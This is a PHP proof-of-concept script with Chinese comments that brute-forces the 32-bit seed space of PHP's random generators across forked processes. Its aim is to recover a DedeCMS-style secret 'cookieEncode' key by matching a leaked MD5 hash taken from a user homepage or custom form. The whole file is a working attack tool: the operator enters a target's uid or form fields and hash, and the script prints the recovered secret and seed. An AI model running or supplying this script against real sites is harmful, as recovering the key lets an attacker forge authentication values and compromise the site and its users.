<?php
$t1=microtime(true);
echo "开始时间: $t1\n";
//请填写下面的信息
$cpu = 8; // cpu: CPU核数,$cpu对应到开启的进程的数量,不宜过高
$attack_method = 2; // 碰撞类型: 如果是用户主页就是1, 自定义表单就是2
$attack_param = "";  // 数据: 选择1填写uid, 选择2填写dede_fields
$attack_hash = "";   // hash: 填写hash

$max_ = 4294967296;
$targets_ = [];
$the_1 = (int)($max_ / $cpu);
$the_2 = $max_ % $cpu;
for ($i = 0; $i < $cpu; $i++){
    array_push($targets_,[($i)*$the_1,($i+1)*$the_1]);
}
$chars='abcdefghigklmnopqrstuvwxwyABCDEFGHIGKLMNOPQRSTUVWXWY0123456789';
$max = 61; // strlen($chars) - 1;
$already_test = 0;
for ($i = 0; $i < $cpu; $i++){
    $pid = pcntl_fork();
    if ($pid == -1) {
        die("could not fork");
    } elseif ($pid) {
        ;
        //echo $pid;
        //echo "I'm the Parent $i\n";
    } else {
        //var_dump($targets_[$i][0]);
        the_poc($targets_[$i][0],$targets_[$i][1],$i);
        exit;
    }
}

function the_poc($start,$end,$id){
    global $chars;
    global $max;
    global $attack_method;
    global $attack_param;
    global $attack_hash;
    $the_whole = (int)(($end-$start)/1000000);
    $i_do = 0;

    for($y = $start; $y<= $end; $y++) {
        if (($i_do%1000000) == 1){
                echo "$id 已完成(x1000000): ";
                echo (int)($i_do/1000000);
                echo "/$the_whole\n";
        }
        $i_do = $i_do + 1;
        srand($y);
        $length = rand(28,32);

        mt_srand($y);
        $rnd_cookieEncode='';
        for($i = 0; $i < $length; $i++) {
            $rnd_cookieEncode .= $chars[mt_rand(0, $max)];
        }
        if ($attack_method==1){
            if (substr(md5($rnd_cookieEncode.$attack_param),0,16) == $attack_hash){
                echo "here!!!!\n";
                echo $rnd_cookieEncode;
                echo "\n";
                echo $y;
                echo "\n";
                break;
            }
        }else{
            if (md5($attack_param.$rnd_cookieEncode) == $attack_hash){
                    echo "here!!!!\n";
                    echo $rnd_cookieEncode;
                    echo "\n";
                    echo $y;
                    echo "\n";
            }
        }
    }
}

// 等待子进程执行结束
while (pcntl_waitpid(0, $status) != -1) {
    $status = pcntl_wexitstatus($status);
    $pid = posix_getpid();
    echo "Child $status completed\n";
}
$t2=microtime(true)-$t1; //获取程序1，结束的时间
echo "总计用时: $t2\n";
?>